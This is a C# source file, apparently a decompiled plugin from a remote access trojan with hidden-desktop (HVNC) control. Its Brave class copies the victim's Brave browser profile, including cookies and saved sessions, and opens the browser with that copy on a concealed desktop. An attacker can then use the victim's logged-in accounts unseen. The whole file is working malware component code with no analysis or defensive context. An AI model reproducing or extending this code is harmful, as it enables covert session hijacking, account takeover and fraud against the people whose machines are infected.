using System;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic.Devices;

namespace Plugin.Helper.OpenApp;

internal class Brave
{
	private static readonly Computer PC = new Computer();

	private static readonly string fileNameUserData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data";

	private static readonly string fileNameUserDataCopy = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\Brave Data";

	private static readonly string FilenameBrave = "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";

	private static readonly string FilenameBravex86 = "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";

	public static void OpenBraveBrowser()
	{
		HideDesktop.Load(Plugin.HVNCDesktop);
		try
		{
			if (!File.Exists(FilenameBrave) && !File.Exists(FilenameBravex86))
			{
				return;
			}
			try
			{
				if (!Directory.Exists(fileNameUserDataCopy))
				{
					((ServerComputer)PC).FileSystem.CopyDirectory(fileNameUserData, fileNameUserDataCopy);
				}
			}
			catch
			{
			}
			new Thread((ThreadStart)delegate
			{
				Thread.Sleep(1000);
				HideDesktop.Load(Plugin.HVNCDesktop);
				Open();
			}).Start();
		}
		catch (Exception ex)
		{
			Client.Error("Brave: " + ex.Message);
		}
	}

	public static void Open()
	{
		try
		{
			string text = null;
			if (File.Exists(FilenameBrave))
			{
				text = FilenameBrave;
			}
			if (File.Exists(FilenameBravex86))
			{
				text = FilenameBravex86;
			}
			if (text != null)
			{
				HideDesktop.CreateProcess("\"" + text + "\" --disable-3d-apis --disable-gpu --disable-d3d11 \"--user-data-dir=" + fileNameUserDataCopy + "\"", Plugin.hwid, bAppName: false);
				Thread.Sleep(3000);
				HideDesktop.Load(Plugin.HVNCDesktop);
			}
		}
		catch (Exception ex)
		{
			Client.Error("Brave: " + ex.Message);
		}
	}
}
